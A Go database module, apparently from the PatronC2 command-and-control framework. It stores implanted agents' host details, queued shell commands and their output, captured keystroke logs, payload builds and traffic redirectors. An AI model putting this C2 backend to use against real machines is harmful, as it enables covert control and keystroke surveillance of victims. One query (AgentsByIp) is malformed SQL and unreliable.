package data

import (
	"database/sql"
	"fmt"
	"log"
	"os"

	"github.com/PatronC2/Patron/helper"
	"github.com/PatronC2/Patron/types"	
	"github.com/PatronC2/Patron/lib/logger"	
	_ "github.com/lib/pq"
)

var db *sql.DB

func OpenDatabase() {
    var err error

    host := os.Getenv("DB_HOST")
    port := os.Getenv("DB_PORT")
    user := os.Getenv("DB_USER")
    password := os.Getenv("DB_PASS")
    dbname := os.Getenv("DB_NAME")

    psqlInfo := fmt.Sprintf("host=%s port=%s user=%s "+
        "password=%s dbname=%s sslmode=disable",
        host, port, user, password, dbname)

    db, err = sql.Open("postgres", psqlInfo)
    if err != nil {
        logger.Logf(logger.Error, "Failed to open database connection: %v\n", err)
        return
    }

    err = db.Ping()
    if err != nil {
        logger.Logf(logger.Error, "Failed to ping database: %v\n", err)
        db.Close()
        return
    }

    logger.Logf(logger.Info, "Connected to the database successfully.")
}

func InitDatabase() {

	AgentSQL := `
	CREATE TABLE IF NOT EXISTS "agents" (
		"AgentID" SERIAL PRIMARY KEY,
		"UUID" TEXT NOT NULL UNIQUE,
		"ServerIP" TEXT NOT NULL DEFAULT 'Unknown',
		"ServerPort" TEXT NOT NULL DEFAULT 'Unknown',
		"CallBackFreq" TEXT NOT NULL DEFAULT 'Unknown',
		"CallBackJitter" TEXT NOT NULL DEFAULT 'Unknown',
		"Ip" TEXT NOT NULL DEFAULT 'Unknown',
		"User" TEXT NOT NULL DEFAULT 'Unknown',
		"Hostname" TEXT NOT NULL DEFAULT 'Unknown',
		"LastCallBack" TIMESTAMP
	);
	CREATE OR REPLACE VIEW agents_status AS
	SELECT 
		"AgentID",
		"UUID",
		"ServerIP",
		"ServerPort",
		"CallBackFreq",
		"CallBackJitter",
		"Ip",
		"User",
		"Hostname",
		"LastCallBack",
		CASE 
			WHEN "LastCallBack" IS NULL OR "LastCallBack" < NOW() - INTERVAL '1 second' * 2 * CAST("CallBackFreq" AS INTEGER) THEN 'Offline'
			ELSE 'Online'
		END AS "Status"
	FROM 
		"agents";
	`
	_, err := db.Exec(AgentSQL)
	if err != nil {
		log.Fatal(err.Error())
	}
	logger.Logf(logger.Info, "agents table initialized\n")

	CommandSQL := `
	CREATE TABLE IF NOT EXISTS "Commands" (
		"CommandID" SERIAL PRIMARY KEY,
		"UUID" TEXT,
		"Result" TEXT,
		"CommandType" TEXT,
		"Command" TEXT,
		"CommandUUID" TEXT,
		"Output" TEXT DEFAULT 'Pending',
		FOREIGN KEY ("UUID") REFERENCES "agents" ("UUID")
	);
	`
	_, err = db.Exec(CommandSQL)
	if err != nil {
		log.Fatal(err.Error())
	}
	logger.Logf(logger.Info, "Commands table initialized\n")

	KeylogSQL := `
	CREATE TABLE IF NOT EXISTS "Keylog" (
		"KeylogID" SERIAL PRIMARY KEY,
		"UUID" TEXT,
		"Keys" TEXT,
		FOREIGN KEY ("UUID") REFERENCES "agents" ("UUID")
	);
	`
	_, err = db.Exec(KeylogSQL)
	if err != nil {
		log.Fatal(err.Error())
	}
	logger.Logf(logger.Info, "Keylog table initialized\n")

	PayloadSQL := `
	CREATE TABLE IF NOT EXISTS "Payloads" (
		"PayloadID" SERIAL PRIMARY KEY,
		"UUID" TEXT,
		"Name" TEXT,
		"Description" TEXT,
		"ServerIP" TEXT,
		"ServerPort" TEXT,
		"CallbackFrequency" TEXT,
		"CallbackJitter" TEXT,
		"Concat" TEXT,
		"isDeleted" INTEGER NOT NULL DEFAULT 0
	);
	`
	_, err = db.Exec(PayloadSQL)
	if err != nil {
		log.Fatal(err.Error())
	}
	logger.Logf(logger.Info, "Payloads table initialized\n")

    UsersSQL := `
	CREATE TABLE IF NOT EXISTS users (
		id SERIAL PRIMARY KEY,
		username VARCHAR(50) UNIQUE NOT NULL,
		password_hash TEXT NOT NULL,
		role VARCHAR(20) NOT NULL CHECK (role IN ('admin', 'operator', 'readOnly'))
	);
	`
    _, err = db.Exec(UsersSQL)
    if err != nil {
        log.Fatal(err.Error())
    }
    logger.Logf(logger.Info, "Users table initialized")

	NotesSQL := `
	CREATE TABLE IF NOT EXISTS "notes" (
		"NoteID" SERIAL PRIMARY KEY,
		"UUID" TEXT NOT NULL,
		"Note" TEXT,
		FOREIGN KEY ("UUID") REFERENCES "agents" ("UUID"),
		UNIQUE ("UUID")
	);
	`
	_, err = db.Exec(NotesSQL)
	if err != nil {
		log.Fatal(err.Error())
	}
	logger.Logf(logger.Info, "Notes table initialized\n")

	TagsSQL := `
	CREATE TABLE IF NOT EXISTS "tags" (
		"TagID" SERIAL PRIMARY KEY,
		"UUID" TEXT NOT NULL,
		"Key" TEXT NOT NULL,
		"Value" TEXT,
		FOREIGN KEY ("UUID") REFERENCES "agents" ("UUID"),
		UNIQUE ("UUID", "Key")
	);
	`
	_, err = db.Exec(TagsSQL)
	if err != nil {
		log.Fatal(err.Error())
	}
	logger.Logf(logger.Info, "tags table initialized\n")

	RedirectorsSQL := `
	CREATE TABLE IF NOT EXISTS "redirectors" (
		"RedirectorID" TEXT PRIMARY KEY,
		"Name" TEXT NOT NULL,
		"Description" TEXT,
		"ForwardIP" TEXT,
		"ForwardPort" TEXT,
		"ListenIP" TEXT NOT NULL DEFAULT '0.0.0.0',
		"ListenPort" TEXT NOT NULL,
		"LastReport" TIMESTAMP
	);
	CREATE OR REPLACE VIEW redirector_status AS
	SELECT 
		"RedirectorID",
		"Name",
		"Description",
		"ForwardIP",
		"ForwardPort",
		"ListenIP",
		"ListenPort",
		"LastReport",
		CASE 
			WHEN "LastReport" IS NULL OR "LastReport" < NOW() - INTERVAL '10 minutes' THEN 'Offline'
			ELSE 'Online'
		END AS "Status"
	FROM 
		"redirectors";
	`
	_, err = db.Exec(RedirectorsSQL)
	if err != nil {
		log.Fatal(err.Error())
	}
	logger.Logf(logger.Info, "Redirectors table initialized\n")

}

func CreateAgent(uuid, ServerIP, ServerPort, CallBackFreq, CallBackJitter, Ip, User, Hostname string) error {
    CreateAgentSQL := `
        INSERT INTO "agents" ("UUID", "ServerIP", "ServerPort", "CallBackFreq", "CallBackJitter", "Ip", "User", "Hostname")
        VALUES ($1, $2, $3, $4, $5, $6, $7, $8)`

    _, err := db.Exec(CreateAgentSQL, uuid, ServerIP, ServerPort, CallBackFreq, CallBackJitter, Ip, User, Hostname)
    if err != nil {
        logger.Logf(logger.Error, "Error creating agent in DB: %v", err)
        return err
    }

    logger.Logf(logger.Info, "New agent created in DB: %s", uuid)
    return nil
}


func CreateKeys(uuid string) error {
    CreateKeysSQL := `
        INSERT INTO "Keylog" ("UUID", "Keys")
        VALUES ($1, $2)`

    _, err := db.Exec(CreateKeysSQL, uuid, "")
    if err != nil {
        logger.Logf(logger.Error, "Error creating keylog entry in DB for UUID %s: %v", uuid, err)
        return err
    }

    logger.Logf(logger.Info, "New keylog entry created for agent %s", uuid)
    return nil
}


func CreatePayload(uuid string, name string, description string, ServerIP string, ServerPort string, CallBackFreq string, CallBackJitter string, Concat string) {
	CreateAgentSQL := `INSERT INTO "Payloads" ("UUID", "Name", "Description", "ServerIP", "ServerPort", "CallbackFrequency", "CallbackJitter", "Concat")
	VALUES ($1, $2, $3, $4, $5, $6, $7, $8)`

	statement, err := db.Prepare(CreateAgentSQL)
	if err != nil {

		log.Fatalln(err)
		logger.Logf(logger.Info, "Error in DB\n")
	}

	_, err = statement.Exec(uuid, name, description, ServerIP, ServerPort, CallBackFreq, CallBackJitter, Concat)
	if err != nil {

		log.Fatalln(err)
	}
	logger.Logf(logger.Info, "New Payload created in DB\n")
}

func FetchOneAgent(uuid string) (info types.ConfigurationRequest, err error) {
    query := `
        SELECT 
            "UUID",
            "ServerIP",
            "ServerPort",
            "CallBackFreq",
            "CallBackJitter",
            "Ip",
            "User",
            "Hostname",
            "Status"
        FROM "agents_status" WHERE "UUID"=$1
    `

    err = db.QueryRow(query, uuid).Scan(
        &info.AgentID,
        &info.ServerIP,
        &info.ServerPort,
        &info.CallbackFrequency,
        &info.CallbackJitter,
        &info.AgentIP,
        &info.Username,
        &info.Hostname,
        &info.Status,
    )

    if err == sql.ErrNoRows {
        logger.Logf(logger.Info, "No agent found with UUID: %s", uuid)
        return info, nil
    } else if err != nil {
        logger.Logf(logger.Error, "Error fetching agent with UUID: %s - %v", uuid, err)
        return info, err
    }

    logger.Logf(logger.Info, "Fetched agent: %v", info)
    return info, nil
}


func FetchNextCommand(uuid string) types.CommandResponse {
    var info types.CommandResponse
    query := `
        SELECT 
            "Commands"."UUID", 
            "Commands"."CommandType", 
            "Commands"."Command", 
            "Commands"."CommandUUID"
        FROM "Commands" 
        INNER JOIN "agents" ON "Commands"."UUID" = "agents"."UUID" 
        WHERE "Commands"."UUID" = $1 
        AND "Commands"."Result" = '0' 
        LIMIT 1;
    `

    row := db.QueryRow(query, uuid)
    err := row.Scan(
        &info.AgentID,
        &info.CommandType,
        &info.Command,
        &info.CommandID,
    )
    if err == sql.ErrNoRows {
        logger.Logf(logger.Info, "No commands available for agent: %s\n", uuid)
        return info
    } else if err != nil {
        logger.Logf(logger.Error, "Error fetching command for agent: %v\n", err)
        return info
    }

    logger.Logf(logger.Info, "Fetched command %s for agent %s\n", info.Command, uuid)
    return info
}

func SendAgentCommand(uuid string, result string, CommandType string, Command string, CommandUUID string) {
	SendAgentCommandSQL := `INSERT INTO "Commands" ("UUID", "Result", "CommandType", "Command", "CommandUUID")
	VALUES ($1, $2, $3, $4, $5)`

	statement, err := db.Prepare(SendAgentCommandSQL)
	if err != nil {

		log.Fatalln(err)
		logger.Logf(logger.Info, "Error in DB\n")
	}

	_, err = statement.Exec(uuid, result, CommandType, Command, CommandUUID)
	if err != nil {

		log.Fatalln(err)
	}
	logger.Logf(logger.Info, "Agent %s Reveived New Command \n", uuid)
}

func UpdateAgentConfig(UUID string, ServerIP string, ServerPort string, CallbackFrequency string, CallbackJitter string) {
	updateAgentConfigSQL := `UPDATE "agents" SET "ServerIP"= $1, "ServerPort"= $2, "CallBackFreq"= $3, "CallBackJitter"= $4 WHERE "UUID"= $5`

	statement, err := db.Prepare(updateAgentConfigSQL)
	if err != nil {

		log.Fatalln(err)
		logger.Logf(logger.Info, "Error in DB\n")
	}

	_, err = statement.Exec(ServerIP, ServerPort, CallbackFrequency, CallbackJitter, UUID)
	if err != nil {

		log.Fatalln(err)
	}
	logger.Logf(logger.Info, "Agent %s Reveived Config Update  \n", UUID)
}

func UpdateAgentCheckIn(uuid string) error {
    UpdateSQL := `
        UPDATE "agents"
        SET "LastCallBack" = NOW()
        WHERE "UUID" = $1`

    _, err := db.Exec(UpdateSQL, uuid)
    if err != nil {
        logger.Logf(logger.Error, "Error updating agent check-in for UUID %s: %v", uuid, err)
        return err
    }

    logger.Logf(logger.Info, "Agent %s check-in updated in DB", uuid)
    return nil
}

func UpdateAgentCommand(CommandUUID, Result, Output, uuid string) error {
    updateAgentCommandSQL := `
        UPDATE "Commands"
        SET "Result" = $1, "Output" = $2
        WHERE "CommandUUID" = $3`

    _, err := db.Exec(updateAgentCommandSQL, Result, Output, CommandUUID)
    if err != nil {
        logger.Logf(logger.Error, "Error updating command for CommandUUID %s: %v", CommandUUID, err)
        return err
    }

    logger.Logf(logger.Info, "Command %s updated for agent %s", CommandUUID, uuid)
    return nil
}

func UpdateAgentKeys(UUID, Keys string) error {
    updateAgentKeylogSQL := `
        UPDATE "Keylog"
        SET "Keys" = "Keys" || $1
        WHERE "UUID" = $2
    `
    _, err := db.Exec(updateAgentKeylogSQL, Keys, UUID)
    if err != nil {
        logger.Logf(logger.Error, "Error updating keys for agent with UUID %s: %v", UUID, err)
        return err
    }

    logger.Logf(logger.Info, "Successfully updated keys for agent with UUID %s", UUID)
    return nil
}

// WEB Functions

func Agents() (agentAppend []types.ConfigurationRequest, err error) {
	var agents types.ConfigurationRequest
	FetchSQL := `
	SELECT 
		"UUID",
		"ServerIP", 
		"ServerPort", 
		"CallBackFreq",
		"CallBackJitter",
		"Ip", 
		"User", 
		"Hostname",
		"Status"
	FROM "agents_status"
	`
	row, err := db.Query(FetchSQL)
	if err != nil {
		log.Fatal(err)
	}
	defer row.Close()
	for row.Next() {
		row.Scan(
			&agents.AgentID,
			&agents.ServerIP,
			&agents.ServerPort,
			&agents.CallbackFrequency,
			&agents.CallbackJitter,
			&agents.AgentIP,
			&agents.Username,
			&agents.Hostname,
			&agents.Status,
		)
		agentAppend = append(agentAppend, agents)
	}
	logger.Logf(logger.Info, "Agents: %v", agentAppend)
	return agentAppend, err
}

func AgentsByIp(Ip string) (agentAppend []types.ConfigurationRequest, err error) {
	var agents types.ConfigurationRequest
	FetchSQL := `
	SELECT 
		"UUID", 
		"ServerIP",
		"ServerPort",
		"CallBackFreq", 
		"CallBackJitter", 
		"Ip", 
		"User", 
		"Hostname",
		"Status"
	FROM "agents_status"
	AND "Ip" = $1
	`
	row, err := db.Query(FetchSQL, Ip)
	if err != nil {
		log.Fatal(err)
	}
	defer row.Close()
	for row.Next() {
		row.Scan(
			&agents.AgentID,
			&agents.ServerIP,
			&agents.ServerPort,
			&agents.CallbackFrequency,
			&agents.CallbackJitter,
			&agents.AgentIP,
			&agents.Username,
			&agents.Hostname,
			&agents.Status,
		)
		agentAppend = append(agentAppend, agents)
	}
	return agentAppend, err
}

func Payloads() []types.Payload {
	var payloads types.Payload
	FetchSQL := `
	SELECT 
		"UUID", 
		"Name",
		"Description",
		"ServerIP", 
		"ServerPort", 
		"CallbackFrequency", 
		"CallbackJitter",
		"Concat" 
	FROM "Payloads"
	WHERE "isDeleted"='0'
	`
	row, err := db.Query(FetchSQL)
	if err != nil {
		log.Fatal(err)
	}
	defer row.Close()
	var payloadAppend []types.Payload
	for row.Next() {
		row.Scan(
			&payloads.Uuid,
			&payloads.Name,
			&payloads.Description,
			&payloads.ServerIP,
			&payloads.ServerPort,
			&payloads.CallbackFrequency,
			&payloads.CallbackJitter,
			&payloads.Concat,
		)
		payloadAppend = append(payloadAppend, payloads)
	}
	return payloadAppend
}

func GetAgentCommands(uuid string) (infoAppend []types.AgentCommands, err error) {
	var info types.AgentCommands
	FetchSQL := `
	SELECT 
		"UUID", 
		"CommandType", 
		"Command", 
		"CommandUUID", 
		"Output"
	FROM "Commands"
	WHERE "UUID"= $1 AND "CommandType" = 'shell'
	ORDER BY "CommandID" asc;
	`
	row, err := db.Query(FetchSQL, uuid)
	if err != nil {
		log.Fatal(err)
	}
	defer row.Close()
	for row.Next() {
		row.Scan(
			&info.Uuid,
			&info.CommandType,
			&info.Command,
			&info.CommandUUID,
			&info.Output,
		)
		infoAppend = append(infoAppend, info)
	}

	return infoAppend, err
}

func Keylog(uuid string) []types.KeysRequest {
	var info types.KeysRequest
	FetchSQL := `
	SELECT 
		"UUID",
		"Keys"
	FROM "Keylog"
	WHERE "UUID"= $1
	ORDER BY "KeylogID" asc;
	`
	row, err := db.Query(FetchSQL, uuid)
	if err != nil {
		log.Fatal(err)
	}
	defer row.Close()
	var infoAppend []types.KeysRequest
	for row.Next() {
		row.Scan(
			&info.AgentID,
			&info.Keys,
		)
		info.Keys = helper.FormatKeyLogs(info.Keys)
		infoAppend = append(infoAppend, info)
	}
	return infoAppend
}

func FetchOne(uuid string) (infoAppend []types.ConfigurationResponse, err error) {
	var info types.ConfigurationResponse
	FetchSQL := `
	SELECT 
		"UUID","ServerIP", "ServerPort","CallBackFreq","CallBackJitter"
	FROM "agents" WHERE "UUID"=$1
	`
	row, err := db.Query(FetchSQL, uuid)
	if err != nil {
		log.Fatal(err)
	}
	defer row.Close()
	for row.Next() {
		row.Scan(
			&info.AgentID,
			&info.ServerIP,
			&info.ServerPort,
			&info.CallbackFrequency,
			&info.CallbackJitter,
		)
	}
	infoAppend = append(infoAppend, info)
	logger.Logf(logger.Info, "%v\n", info)
	return infoAppend, err
}

func GetAgentNotes(uuid string) (infoAppend []types.Note, err error) {
	var info types.Note
	FetchSQL := `
	SELECT 
		"NoteID",
		"Note"
	FROM "notes" WHERE "UUID"=$1
	`
	row, err := db.Query(FetchSQL, uuid)
	if err != nil {
		log.Fatal(err)
	}
	defer row.Close()
	for row.Next() {
		row.Scan(
			&info.NoteID,
			&info.Note,
		)
	}
	infoAppend = append(infoAppend, info)
	logger.Logf(logger.Info, "%v\n", info)
	return infoAppend, err
}

func PutAgentNotes(uuid string, note string) error {
    UpsertSQL := `
    INSERT INTO "notes" ("UUID", "Note")
    VALUES ($1, $2)
    ON CONFLICT ("UUID")
    DO UPDATE SET "Note" = $2;
    `
    _, err := db.Exec(UpsertSQL, uuid, note)
    if err != nil {
        log.Fatalln(err)
        return err
    }
    logger.Logf(logger.Info, "Notes for UUID %v have been updated in DB\n", uuid)
    return nil
}

func GetAgentTags(uuid string) (infoAppend []types.Tag, err error) {
	var info types.Tag
	FetchSQL := `
	SELECT
		"TagID",
		"Key",
		"Value"
	FROM "tags" WHERE "UUID"=$1
	`
	rows, err := db.Query(FetchSQL, uuid)
	if err != nil {
		log.Fatal(err)
		return nil, err
	}
	defer rows.Close()

	for rows.Next() {
		err := rows.Scan(
			&info.TagID,
			&info.Key,
			&info.Value,
		)
		if err != nil {
			log.Println("Error scanning row:", err)
			return nil, err
		}
		infoAppend = append(infoAppend, info)
	}

	if err := rows.Err(); err != nil {
		log.Println("Error iterating over rows:", err)
		return nil, err
	}

	logger.Logf(logger.Info, "Tags for %v: %+v\n", uuid, infoAppend)
	return infoAppend, nil
}


func PutAgentTags(uuid string, key string, value string) error {
    PutTagsSQL := `
    INSERT INTO "tags" ("UUID", "Key", "Value")
    VALUES ($1, $2, $3)
    ON CONFLICT ("UUID", "Key") DO UPDATE 
    SET "Value" = EXCLUDED."Value"
    `
    _, err := db.Exec(PutTagsSQL, uuid, key, value)
    if err != nil {
        log.Fatalln(err)
        return err
    }
    logger.Logf(logger.Info, "Tags for %v have been updated in DB\n", uuid)
    return nil
}

func DeleteTag(tagid string) error {
    DeleteTagsSQL := `
    DELETE FROM "tags"
	WHERE "TagID" = $1
    `
    _, err := db.Exec(DeleteTagsSQL, tagid)
    if err != nil {
        log.Fatalln(err)
        return err
    }
    logger.Logf(logger.Info, "Tag %d has been deleted\n", tagid)
    return nil
}

func GetRedirectors() (redirectors []types.Redirector, err error) {
	var data types.Redirector
	FetchSQL := `
	SELECT
		"RedirectorID",
		"Name",
		"Description",
		"ForwardIP",
		"ForwardPort",
		"ListenIP",
		"ListenPort",
		"Status"
	FROM "redirector_status"
	`
	rows, err := db.Query(FetchSQL)
	if err != nil {
		log.Fatal(err)
		return nil, err
	}
	defer rows.Close()

	for rows.Next() {
		err := rows.Scan(
			&data.RedirectorID,
			&data.Name,
			&data.Description,
			&data.ForwardIP,
			&data.ForwardPort,
			&data.ListenIP,
			&data.ListenPort,
			&data.Status,
		)
		if err != nil {
			log.Println("Error scanning row:", err)
			return nil, err
		}
		redirectors = append(redirectors, data)
	}

	if err := rows.Err(); err != nil {
		log.Println("Error iterating over rows:", err)
		return nil, err
	}

	logger.Logf(logger.Info, "Current redirectors: %+v\n", redirectors)
	return redirectors, nil
}

func CreateRedirector(RedirectorID, Name, Description, ForwardIP, ForwardPort, ListenIP, ListenPort string) error {
    InsertSQL := `
        INSERT INTO "redirectors" ("RedirectorID", "Name", "Description", "ForwardIP", "ForwardPort", "ListenIP", "ListenPort")
        VALUES ($1, $2, $3, $4, $5, $6, $7)
    `

    _, err := db.Exec(InsertSQL, RedirectorID, Name, Description, ForwardIP, ForwardPort, ListenIP, ListenPort)
    if err != nil {
        logger.Logf(logger.Error, "Error creating redirector with RedirectorID %s: %v", RedirectorID, err)
        return err
    }

    logger.Logf(logger.Info, "Successfully created redirector with RedirectorID %s", RedirectorID)
    return nil
}

func SetRedirectorStatus(RedirectorID string) error {
    UpdateSQL := `
        UPDATE "redirectors"
        SET "LastReport" = NOW()
        WHERE "RedirectorID" = $1;
    `

    _, err := db.Exec(UpdateSQL, RedirectorID)
    if err != nil {
        logger.Logf(logger.Error, "Error updating redirector status for RedirectorID %s: %v", RedirectorID, err)
        return err
    }

    logger.Logf(logger.Info, "Updated redirector status for RedirectorID %s", RedirectorID)
    return nil
}
